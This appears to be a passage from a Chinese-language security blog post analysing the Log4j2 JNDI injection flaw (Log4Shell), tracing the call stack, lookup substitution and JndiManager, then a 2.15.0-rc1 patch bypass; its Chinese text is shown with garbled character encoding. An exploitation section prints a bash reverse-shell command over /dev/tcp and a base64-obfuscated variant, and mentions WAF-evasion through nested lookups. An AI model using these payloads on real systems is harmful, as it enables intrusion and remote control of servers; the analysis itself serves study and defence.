</span></span><span style="display:flex;"><span>directEncodeEvent:197, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>tryAppend:190, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>append:181, AbstractOutputStreamAppender (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">appender</span>)
</span></span><span style="display:flex;"><span>tryCallAppender:156, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppender0:129, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppenderPreventRecursion:120, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppender:84, AppenderControl (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>callAppenders:540, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>processLogEvent:498, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:481, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:456, LoggerConfig (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:63, DefaultReliabilityStrategy (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">config</span>)
</span></span><span style="display:flex;"><span>log:161, Logger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">core</span>)
</span></span><span style="display:flex;"><span>tryLogMessage:2205, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessageTrackRecursion:2159, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessageSafely:2142, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logMessage:2017, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>logIfEnabled:1983, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>error:740, AbstractLogger (org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">logging</span>.<span style="color:#007f7f">log4j</span>.<span style="color:#007f7f">spi</span>)
</span></span><span style="display:flex;"><span>main:18, main
</span></span></code></pre></div><h3 id="æ—¥å¿—è®°å½•è§¦å‘ç‚¹">æ—¥å¿—è®°å½•/è§¦å‘ç‚¹<a hidden class="anchor" aria-hidden="true" href="#æ—¥å¿—è®°å½•è§¦å‘ç‚¹">#</a></h3>
<p>æ ¹æ®å‡½æ•°æ ˆï¼Œè¿™é‡Œæ˜¯æ ¹æ®<code>logger</code>ç­‰çº§è°ƒç”¨å¯¹åº”çš„æ–¹æ³•</p>
<p>æˆ‘ä»¬é€šè¿‡<code>LogManager.getLogger()</code>æ¥è·å–ä¸€ä¸ª<code>Logger</code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶<code>debug/info/error/warn/fatal/trace/log</code> ç­‰æ–¹æ³•è®°å½•æ—¥å¿—ç­‰ä¿¡æ¯ã€‚è¿™äº›æ–¹æ³•ï¼Œéƒ½ä¼šé¦–å…ˆä½¿ç”¨<code>org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled</code>çš„è‹¥å¹²ä¸ªé‡è½½æ–¹æ³•æ¥æ ¹æ®å½“å‰é…ç½®è®°å½•æ—¥å¿—ç­‰çº§ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¾“å‡ºconsoleå’Œè®°å½•æ—¥å¿—æ–‡ä»¶ã€‚</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šè¾“å‡º WARN/ERROR/FATAL ç­‰çº§çš„æ—¥å¿—ã€‚å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶æ›´æ”¹æ—¥å¿—è¾“å‡ºç­‰çº§ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;Configuration&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;Loggers&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="font-weight:bold">&lt;Logger</span> <span style="color:#007f7f">name=</span><span style="color:#0ff;font-weight:bold">&#34;org.su18&#34;</span> <span style="color:#007f7f">level=</span><span style="color:#0ff;font-weight:bold">&#34;All&#34;</span><span style="font-weight:bold">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;/Loggers&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/Configuration&gt;</span>
</span></span></code></pre></div><p>ä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥é…ç½®è¾“å‡ºç­‰çº§ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>LoggerContext ctx          = (LoggerContext) LogManager.<span style="color:#007f7f">getContext</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>Configuration config       = ctx.<span style="color:#007f7f">getConfiguration</span>();
</span></span><span style="display:flex;"><span>LoggerConfig  loggerConfig = config.<span style="color:#007f7f">getLoggerConfig</span>(LogManager.<span style="color:#007f7f">ROOT_LOGGER_NAME</span>);
</span></span><span style="display:flex;"><span>loggerConfig.<span style="color:#007f7f">setLevel</span>(Level.<span style="color:#007f7f">ALL</span>);
</span></span><span style="display:flex;"><span>ctx.<span style="color:#007f7f">updateLoggers</span>();
</span></span></code></pre></div><p>æœ¬æ­¤æ¼æ´çš„è§¦å‘ç‚¹ï¼Œå®é™…ä¸Šæ˜¯ä» <code>AbstractLogger#logMessage</code> æ–¹æ³•å¼€å§‹çš„ï¼Œå‡¡æ˜¯è°ƒç”¨äº†æ­¤æ–¹æ³•çš„ info/error/warn ç­‰å…¨éƒ¨æ–¹æ³•å‡å¯ä»¥ä½œä¸ºæœ¬æ¬¡æ¼æ´çš„è§¦å‘ç‚¹ï¼Œåªæ˜¯å–å†³äºé…ç½®çš„æ¼æ´è¾“å‡ºç­‰çº§ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919163156264.png" alt="image-20220919163156264"  />
</p>
<p>å¯ä»¥çœ‹åˆ°<code>AbstarctLooger</code>å®é™…ä¸Šæ˜¯å®ç°äº†<code>Logger</code>æä¾›çš„æ¥å£ã€‚</p>
<h3 id="æ¶ˆæ¯æ ¼å¼åŒ–">æ¶ˆæ¯æ ¼å¼åŒ–<a hidden class="anchor" aria-hidden="true" href="#æ¶ˆæ¯æ ¼å¼åŒ–">#</a></h3>
<p>è¿™é‡Œæ˜¯è°ƒç”¨<code>MessagePatternConverter</code>é‡Œé¢çš„<code>format</code>æ–¹æ³•æ¥å®ç°æ ¼å¼åŒ–ã€‚</p>
<p>Log4j2 ä½¿ç”¨ <code>org.apache.logging.log4j.core.pattern.MessagePatternConverter</code> æ¥å¯¹æ—¥å¿—æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œåœ¨å®ä¾‹åŒ– MessagePatternConverter æ—¶ä¼šä» Properties åŠ Options ä¸­è·å–é…ç½®æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦æä¾› Lookups åŠŸèƒ½ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.<span style="color:#007f7f">getProperties</span>().<span style="color:#007f7f">getBooleanProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;log4j2.formatMsgNoLookups&#34;</span>, <span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">private</span> MessagePatternConverter(<span style="color:#fff;font-weight:bold">final</span> Configuration config, <span style="color:#fff;font-weight:bold">final</span> String[] options) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">super</span>(<span style="color:#0ff;font-weight:bold">&#34;Message&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;message&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">formats</span> = options;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">config</span> = config;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">int</span> noLookupsIdx = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">loadNoLookups</span>(options);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">noLookups</span> = Constants.<span style="color:#007f7f">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> || noLookupsIdx &gt;= 0;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">textRenderer</span> = <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">loadMessageRenderer</span>(noLookupsIdx &gt;= 0 ? (String[])ArrayUtils.<span style="color:#007f7f">remove</span>(options, noLookupsIdx) : options);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°åœ¨<code>2.14.1</code>ç‰ˆæœ¬çš„log4j2å®ƒé»˜è®¤çš„<code>log4j2.formatMsgLookups</code>é…ç½®å€¼ä¸º<code>false</code>ï¼Œå› æ­¤<code>Lookups</code>åŠŸèƒ½é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</p>
<p>ç„¶åæŸ¥çœ‹<code>format</code>æ–¹æ³•ï¼Œè°ƒç”¨<code>StrSubsitutor</code>æ–¹æ³•è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919170045148.png" alt="image-20220919170045148"  />
</p>
<h3 id="å­—ç¬¦ä¸²æ›¿æ¢">å­—ç¬¦ä¸²æ›¿æ¢<a hidden class="anchor" aria-hidden="true" href="#å­—ç¬¦ä¸²æ›¿æ¢">#</a></h3>
<p>Log4j2 æä¾› Lookup åŠŸèƒ½çš„å­—ç¬¦æ›¿æ¢çš„å…³é”®å¤„ç†ç±»ï¼Œä½äº<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>ï¼Œé¦–å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»ã€‚</p>
<p>ç±»ä¸­æä¾›äº†å…³é”®çš„ <code>DEFAULT_ESCAPE</code> æ˜¯ <code>$</code>ï¼Œ<code>DEFAULT_PREFIX</code> å‰ç¼€æ˜¯ <code>${</code>ï¼Œ<code>DEFAULT_SUFFIX</code> åç¼€æ˜¯ <code>}</code>ï¼Œ<code>DEFAULT_VALUE_DELIMITER_STRING</code> èµ‹å€¼åˆ†éš”ç¬¦æ˜¯ <code>:-</code>ï¼Œ<code>ESCAPE_DELIMITER_STRING</code> æ˜¯ <code>:\-</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919170236685.png" alt="image-20220919170236685"  />
</p>
<p>ç„¶åé€šè¿‡<code>StrSubstitutor</code>åˆå§‹åŒ–çš„æ„é€ å™¨ï¼Œå°†<code>prefixMather</code>ã€<code>suffixMatcher</code>ã€<code>escapeChar</code>è¿›è¡Œèµ‹å€¼</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919180312435.png" alt="image-20220919180312435"  />
</p>
<p>è¿™ä¸ªç±»æä¾›äº†<code>substitute</code>æ–¹æ³•ï¼Œæ˜¯æ•´ä¸ª<code>Lookup</code>åŠŸèƒ½çš„æ ¸å¿ƒï¼Œç”¨æ¥é€’å½’æ›¿æ¢ç›¸åº”çš„å­—ç¬¦ï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹é€»è¾‘ã€‚</p>
<p>é€šè¿‡<code>while</code>å¾ªç¯é€ä¸ªå­—ç¬¦å¯»æ‰¾<code>${</code>å‰ç¼€ã€‚</p>
<p>posä¸ºå½“å‰å­—ç¬¦ä¸²å¤´æŒ‡é’ˆï¼ŒprefixMatcher.isMatchåªè´Ÿè´£åŒ¹é… <strong>${</strong> ä¸¤ä¸ªå­—ç¬¦ã€‚å¦‚æœåŒ¹é…åˆ°å°±è¿›å…¥ç¬¬äºŒå±‚å¾ªç¯åŒ¹é…ï¼ŒåŸç†å’Œä»£ç ç›¸ä¼¼ã€‚å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°**}**å­—ç¬¦ï¼ŒposæŒ‡é’ˆå°±æ­£å¸¸+1ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919180746020.png" alt="image-20220919180746020"  />
</p>
<p>æ‰¾åˆ°å‰ç¼€åå¼€å§‹å¯»æ‰¾åç¼€ï¼Œä½†æ˜¯åœ¨æ‰¾åç¼€çš„<code>while</code>å¾ªç¯é‡Œé¢ï¼Œåˆåˆ¤æ–­äº†æ˜¯å¦æ›¿æ¢å˜é‡ä¸­çš„å€¼ï¼Œå¦‚æœæ›¿æ¢ï¼Œå†åŒ¹é…ä¸€æ¬¡å‰ç¼€ï¼Œå¦‚æœåˆæ‰¾åˆ°äº†å‰ç¼€ï¼Œåˆ™<code>continue</code>è·³å‡ºå¾ªç¯ï¼Œå†èµ°ä¸€æ¬¡æ‰¾åç¼€çš„é€»è¾‘ï¼Œç”¨æ¥æ»¡è¶³å˜é‡ä¸­åµŒå¥—çš„è¿‡ç¨‹ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182217609.png" alt="image-20220919182217609"  />
</p>
<p>æ‰¾åç¼€<code>}</code>çš„ä»£ç </p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182334040.png" alt="image-20220919182334040"  />
</p>
<p>åç»­çš„å¤„ç†ä¸­ï¼Œé€šè¿‡å¤šä¸ª if/else ç”¨æ¥åŒ¹é… <code>:-</code> å’Œ <code>:\-</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182621510.png" alt="image-20220919182621510"  />
</p>
<ul>
<li><code>:-</code> æ˜¯ä¸€ä¸ªèµ‹å€¼å…³é”®å­—ï¼Œå¦‚æœç¨‹åºå¤„ç†åˆ° <code>${aaaa:-bbbb}</code> è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œå¤„ç†çš„ç»“æœå°†ä¼šæ˜¯ <code>bbbb</code>ï¼Œ<code>:-</code> å…³é”®å­—å°†ä¼šè¢«æˆªå–æ‰ï¼Œè€Œä¹‹å‰çš„å­—ç¬¦ä¸²éƒ½ä¼šè¢«èˆå¼ƒæ‰ã€‚</li>
<li><code>:\-</code> æ˜¯è½¬ä¹‰çš„ <code>:-</code>ï¼Œå¦‚æœä¸€ä¸ªç”¨ <code>a:b</code> è¡¨ç¤ºçš„é”®å€¼å¯¹çš„ key <code>a</code> ä¸­åŒ…å« <code>:</code>ï¼Œåˆ™éœ€è¦ä½¿ç”¨è½¬ä¹‰æ¥é…åˆå¤„ç†ï¼Œä¾‹å¦‚ <code>${aaa:\\-bbb:-ccc}</code>ï¼Œä»£è¡¨ key æ˜¯ï¼Œ<code>aaa:bbb</code>ï¼Œvalue æ˜¯ <code>ccc</code>ã€‚</li>
</ul>
<p>åœ¨æ²¡æœ‰åŒ¹é…åˆ°å˜é‡èµ‹å€¼æˆ–å¤„ç†ç»“æŸåï¼Œå°†ä¼šè°ƒç”¨ <code>resolveVariable</code> æ–¹æ³•è§£ææ»¡è¶³ Lookup åŠŸèƒ½çš„è¯­æ³•ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„ lookup ï¼Œå°†è¿”å›çš„ç»“æœæ›¿æ¢å›åŸå­—ç¬¦ä¸²åï¼Œå†æ¬¡è°ƒç”¨ <code>substitute</code> æ–¹æ³•è¿›è¡Œé€’å½’è§£æã€‚</p>
<ul>
<li>ç»§ç»­æˆªå–<code>${}</code>ä¸­çš„å†…å®¹ï¼Œä¸»è¦æ˜¯ä¸ºäº†åˆ¤æ–­æ˜¯å¦è¿˜æœ‰<code>${}</code></li>
</ul>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919182812878.png" alt="image-20220919182812878"  />
</p>
<p>å› æ­¤åœ¨å­—ç¬¦ä¸²æ›¿æ¢çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ–¹æ³•æä¾›äº†ä¸€äº›ç‰¹æ®Šçš„å†™æ³•ï¼Œå¹¶æ”¯æŒé€’å½’è§£æã€‚è€Œè¿™äº›ç‰¹æ€§ï¼Œå°†ä¼šå¯ä»¥ç”¨æ¥è¿›è¡Œç»•è¿‡ WAFã€‚</p>
<p><code>resolveVariable</code> åˆ™è°ƒç”¨ <code>this.variableResolver#lookup</code> æ–¹æ³•è¿›è¡Œå¤„ç†ï¼Œè€Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªä»£ç†ç±» <code>Interpolator</code>ï¼Œè¿™ä¸ªç±»åœ¨æ¥ä¸‹æ¥çš„å†…å®¹è¿›è¡Œè¯´æ˜</p>
<h3 id="lookupå¤„ç†"><code>Lookup</code>å¤„ç†<a hidden class="anchor" aria-hidden="true" href="#lookupå¤„ç†">#</a></h3>
<p>ç”±ä¸Šé¢çš„å‡½æ•°æ ˆè°ƒç”¨ï¼Œæˆ‘ä»¬çŸ¥é“log4j2ä½¿ç”¨<code>org.apache.logging.log4j.core.lookup.Interpolator</code> ç±»æ¥ä»£ç†æ‰€æœ‰çš„ <code>StrLookup</code> å®ç°ç±»ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨å®é™…ä½¿ç”¨ Lookup åŠŸèƒ½æ—¶ï¼Œç”± Interpolator è¿™ä¸ªç±»æ¥å¤„ç†å’Œåˆ†å‘ã€‚</p>
<p>è¿™ä¸ªç±»åœ¨åˆå§‹åŒ–æ—¶åˆ›å»ºäº†ä¸€ä¸ª <code>strLookupMap</code> ï¼Œå°†ä¸€äº› lookup åŠŸèƒ½å…³é”®å­—å’Œå¤„ç†ç±»è¿›è¡Œäº†æ˜ å°„ï¼Œå­˜æ”¾åœ¨è¿™ä¸ª Map ä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183113435.png" alt="image-20220919183113435"  />
</p>
<p>é»˜è®¤æ˜¯åŠ å…¥ log4jã€sysã€envã€mainã€markerã€javaã€lowerã€upperã€jndiã€jvmrunargsã€springã€kubernetesã€dockerã€webã€dateã€ctxï¼Œç”±äºéƒ¨åˆ†åŠŸèƒ½çš„æ”¯æŒå¹¶ä¸åœ¨ core åŒ…ä¸­ï¼Œæ‰€ä»¥å¦‚æœåŠ è½½ä¸åˆ°å¯¹åº”çš„å¤„ç†ç±»ï¼Œåˆ™ä¼šæ·»åŠ è­¦å‘Šä¿¡æ¯å¹¶è·³è¿‡ã€‚è€Œè¿™äº›ä¸åŒ Lookup åŠŸèƒ½çš„æ”¯æŒï¼Œæ˜¯éšç€ç‰ˆæœ¬æ›´æ–°çš„ã€‚</p>
<p>å¤„ç†å’Œåˆ†å‘çš„å…³é”®é€»è¾‘åœ¨äºå…¶ <code>lookup</code> æ–¹æ³•ï¼Œé€šè¿‡ <code>:</code> ä½œä¸ºåˆ†éš”ç¬¦æ¥åˆ†éš” Lookup å…³é”®å­—åŠå‚æ•°ï¼Œä»<code>strLookupMap</code> ä¸­æ ¹æ®å…³é”®å­—ä½œä¸º key åŒ¹é…åˆ°å¯¹åº”çš„å¤„ç†è§£æç±»ï¼Œå¹¶è°ƒç”¨å…¶ lookup æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183253221.png" alt="image-20220919183253221"  />
</p>
<p>æœ¬æ¬¡æ¼æ´çš„è§¦å‘æ–¹å¼æ˜¯ä½¿ç”¨ <code>jndi:</code> å…³é”®å­—æ¥è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå¯¹äº <code>jndi:</code> å…³é”®å­—çš„å¤„ç†ç±»ä¸º <code>org.apache.logging.log4j.core.lookup.JndiLookup</code> ã€‚çœ‹ä¸€ä¸‹æœ€å…³é”®çš„ <code>lookup</code> æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä½¿ç”¨äº† JndiManager æ¥æ”¯æŒ JNDI çš„æŸ¥è¯¢åŠŸèƒ½ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183505950.png" alt="image-20220919183505950"  />
</p>
<h3 id="jdniæŸ¥è¯¢"><code>JDNI</code>æŸ¥è¯¢<a hidden class="anchor" aria-hidden="true" href="#jdniæŸ¥è¯¢">#</a></h3>
<p>Log4j2 ä½¿ç”¨ <code>org.apache.logging.log4j.core.net.JndiManager</code> æ¥æ”¯æŒ JDNI ç›¸å…³æ“ä½œã€‚</p>
<p>JndiManager ä½¿ç”¨ç§æœ‰å†…éƒ¨ç±» JndiManagerFactory æ¥åˆ›å»º JndiManager å®ä¾‹ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183709932.png" alt="image-20220919183709932"  />
</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ InitialContext å®ä¾‹ï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ é€’ç”¨æ¥åˆ›å»º JndiManagerï¼Œè¿™ä¸ª Context è¢«ä¿å­˜åœ¨æˆå‘˜å˜é‡ context ä¸­ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183741801.png" alt="image-20220919183741801"  />
</p>
<p><code>JndiManager#lookup</code> æ–¹æ³•åˆ™è°ƒç”¨ <code>this.context.lookup()</code> å®ç° JNDI æŸ¥è¯¢æ“ä½œã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919183823453.png" alt="image-20220919183823453"  />
</p>
<p>æœ€ç»ˆé€ æˆ<code>JNDI</code>æ³¨å…¥</p>
<h2 id="0x05-æ¼æ´åˆ©ç”¨">0x05 æ¼æ´åˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#0x05-æ¼æ´åˆ©ç”¨">#</a></h2>
<p>æˆ‘ä»¬è¿™é‡Œå°±é‡‡ç”¨ç®€å•çš„åå¼¹<code>shell</code>æ‹¿åˆ°æƒé™å³å¯ã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>åå¼¹shellå‘½ä»¤ï¼š
</span></span><span style="display:flex;"><span>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8899 0&gt;&amp;<span style="color:#ff0;font-weight:bold">1</span>
</span></span><span style="display:flex;"><span>base64åŠ å¯†ï¼š
</span></span><span style="display:flex;"><span>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i}
</span></span></code></pre></div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20220919184922436.png" alt="image-20220919184922436"  />
</p>
<h2 id="0x06-ç»•è¿‡å§¿åŠ¿">0x06 ç»•è¿‡å§¿åŠ¿<a hidden class="anchor" aria-hidden="true" href="#0x06-ç»•è¿‡å§¿åŠ¿">#</a></h2>
<h3 id="rc1-ç»•è¿‡">Rc1 ç»•è¿‡<a hidden class="anchor" aria-hidden="true" href="#rc1-ç»•è¿‡">#</a></h3>
<p>rc1æ›´æ–°</p>
<ul>
<li>ç§»é™¤äº†ä» Properties ä¸­è·å– Lookup é…ç½®çš„é€‰é¡¹ï¼Œå¹¶ä¿®æ”¹åˆ¤æ–­é€»è¾‘ï¼Œé»˜è®¤ä¸å¼€å¯ lookup åŠŸèƒ½ã€‚
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332152586.png" alt="img"  />
</li>
</ul>
</li>
<li><code>JndiManager#lookup</code> æ–¹æ³•ä¸­æ·»åŠ äº†æ ¡éªŒï¼Œä½¿ç”¨äº† JndiManagerFactory æ¥åˆ›å»º JndiManager å®ä¾‹ï¼Œä¸å†ä½¿ç”¨ InitialContextï¼Œè€Œæ˜¯ä½¿ç”¨å­ç±» InitialDirContextï¼Œå¹¶ä¸ºå…¶æ·»åŠ ç™½åå• JNDI åè®®ã€ç™½åå•ä¸»æœºåã€ç™½åå•ç±»åã€‚
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332549257.png" alt="img"  />
</li>
</ul>
</li>
</ul>
<p>æ¼æ´ç‚¹</p>
<ul>
<li>åœ¨å…³é”®çš„ lookup å‡½æ•°ä¸­åŠ å…¥äº†æ ¡éªŒåˆ¤æ–­ï¼Œä½†æ˜¯ç”±äºæ ¡éªŒé€»è¾‘æœ‰è¯¯ï¼Œç¨‹åºåœ¨ catch ä½å¼‚å¸¸åæ²¡æœ‰ returnï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ <code>URISyntaxException</code> å¼‚å¸¸æ¥ç»•è¿‡æ ¡éªŒï¼Œç›´æ¥èµ°åˆ°åé¢çš„ lookupã€‚</li>
</ul>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1639332979607.png" alt="img"  />
</p>
<ul>
